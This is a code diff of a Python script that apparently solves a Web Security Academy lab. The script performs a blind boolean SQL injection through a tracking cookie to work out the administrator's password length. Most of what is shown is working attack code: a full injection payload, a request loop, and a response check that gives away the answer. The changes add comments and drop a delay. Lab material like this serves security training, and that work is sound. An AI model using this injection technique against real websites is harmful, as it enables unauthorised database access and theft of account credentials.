@@ -2,7 +2,7 @@
 from pwn import * 
 import requests,signal,time,pdb,sys,string
 
-def def_handler(sig,frame):
+def def_handler(sig,frame): #to make sure we exit with Crtl+C
     print("\n\n[!] Stopping Hack...\n")
     sys.exit(1)
 
@@ -12,11 +12,9 @@ url="https://0a82001904075c7b85385fbb00da008e.web-security-academy.net/filter?ca
 characters = string.ascii_lowercase + string.digits
 
 def makeRequest():
-    p1 = log.progress("Hacking")
-    p1.status("Start Hacking...")
-
-    time.sleep(2)
+    p1 = log.progress("Hacking") #Status Bars just to make it prettier
     password = ""
+    
     for number in range(0,30):
         cookies1 = {
                     'TrackingId': "cXpjfSas1knJFT2g' AND (select 'a' from users where username='administrator' and LENGTH(password)>=%i)='a" % (number),
@@ -24,7 +22,7 @@ def makeRequest():
                 }
         http=requests.get(url,cookies=cookies1)
         p1.status(cookies1['TrackingId'])
-        if "Welcome back!" not in http.text:
+        if "Welcome back!" not in http.text: #We saw that on this website we receive a "Welcome Back!" message when we interfere with SQL Query
             pass_lenght = number -1
             break
             
